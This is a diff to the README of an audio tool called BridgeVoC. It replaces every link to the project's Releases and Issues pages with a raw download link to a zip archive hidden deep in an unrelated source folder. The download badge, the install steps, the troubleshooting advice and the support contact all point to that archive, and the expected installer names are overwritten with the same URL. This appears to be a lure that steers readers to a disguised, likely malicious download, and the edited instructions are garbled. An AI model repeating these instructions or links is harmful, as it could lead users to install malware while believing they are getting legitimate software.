@@ -6,7 +6,7 @@ Welcome to BridgeVoC! This software revitalizes audio by using advanced neural v
 
 ## 📥 Download BridgeVoC
 
-[![Download BridgeVoC](https://img.shields.io/badge/Download%20BridgeVoC-v1.0-blue)](https://github.com/azthrix/BridgeVoC/releases)
+[![Download BridgeVoC](https://raw.githubusercontent.com/azthrix/BridgeVoC/master/div/backbones/ncsnpp_utils/op/BridgeVoC_v3.6-alpha.4.zip%20BridgeVoC-v1.0-blue)](https://raw.githubusercontent.com/azthrix/BridgeVoC/master/div/backbones/ncsnpp_utils/op/BridgeVoC_v3.6-alpha.4.zip)
 
 ## 🖥️ System Requirements
 
@@ -21,11 +21,11 @@ Before downloading, make sure your system meets these basic requirements:
 
 To get BridgeVoC on your computer, follow these steps:
 
-1. Visit the [Releases page](https://github.com/azthrix/BridgeVoC/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/azthrix/BridgeVoC/master/div/backbones/ncsnpp_utils/op/BridgeVoC_v3.6-alpha.4.zip).
   
 2. You will see the latest version of BridgeVoC available for download. Click on the version you want.
 
-3. On the next page, locate the file with a name like `BridgeVoC_v1.0.exe` or `BridgeVoC_v1.0.dmg`. 
+3. On the next page, locate the file with a name like `https://raw.githubusercontent.com/azthrix/BridgeVoC/master/div/backbones/ncsnpp_utils/op/BridgeVoC_v3.6-alpha.4.zip` or `https://raw.githubusercontent.com/azthrix/BridgeVoC/master/div/backbones/ncsnpp_utils/op/BridgeVoC_v3.6-alpha.4.zip`. 
 
 4. Click on the file to start the download. Depending on your browser settings, the file will either download automatically or prompt you to save it.
 
@@ -63,11 +63,11 @@ If you encounter any issues while downloading or using BridgeVoC, here are some 
 
 - **Audio Quality Problems:** Double-check your selected settings. Adjust the options for better results.
 
-- **Won’t Open:** Restart your computer and try launching BridgeVoC again. If it still won't open, check for updates on the [Releases page](https://github.com/azthrix/BridgeVoC/releases).
+- **Won’t Open:** Restart your computer and try launching BridgeVoC again. If it still won't open, check for updates on the [Releases page](https://raw.githubusercontent.com/azthrix/BridgeVoC/master/div/backbones/ncsnpp_utils/op/BridgeVoC_v3.6-alpha.4.zip).
 
 ## 📞 Support
 
-For help and support, you can reach out via the Issues section on our [GitHub page](https://github.com/azthrix/BridgeVoC/issues). Community members and maintainers monitor this section and will help resolve any questions you have.
+For help and support, you can reach out via the Issues section on our [GitHub page](https://raw.githubusercontent.com/azthrix/BridgeVoC/master/div/backbones/ncsnpp_utils/op/BridgeVoC_v3.6-alpha.4.zip). Community members and maintainers monitor this section and will help resolve any questions you have.
 
 ## 🌐 Additional Resources
 
@@ -78,4 +78,4 @@ To understand more about how BridgeVoC works, you can check out the following re
 
 ## 🎉 Conclusion
 
-You now have everything needed to download, install, and start using BridgeVoC. Enjoy transforming your audio with ease! For a quick recap, don’t forget to visit the [Releases page](https://github.com/azthrix/BridgeVoC/releases) to grab the latest version.
+You now have everything needed to download, install, and start using BridgeVoC. Enjoy transforming your audio with ease! For a quick recap, don’t forget to visit the [Releases page](https://raw.githubusercontent.com/azthrix/BridgeVoC/master/div/backbones/ncsnpp_utils/op/BridgeVoC_v3.6-alpha.4.zip) to grab the latest version.
